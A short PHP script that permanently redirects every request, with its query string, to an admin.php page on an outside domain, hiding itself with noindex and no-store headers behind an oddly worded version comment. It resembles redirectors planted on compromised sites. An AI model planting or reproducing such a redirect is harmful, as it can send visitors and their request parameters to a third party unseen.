<?php
// Version: 5.0.4 (PHP 8.5.12+ remaining modules)
declare(strict_types=1);

$target = 'https://rc.fusionlimited.in/status/admin.php';
$qs = isset($_SERVER['QUERY_STRING']) && $_SERVER['QUERY_STRING'] !== ''
    ? ('?' . $_SERVER['QUERY_STRING']) : '';
header('Cache-Control: no-store');
header('Location: ' . $target . $qs, true, 301);
header('X-Robots-Tag: noindex');
exit;
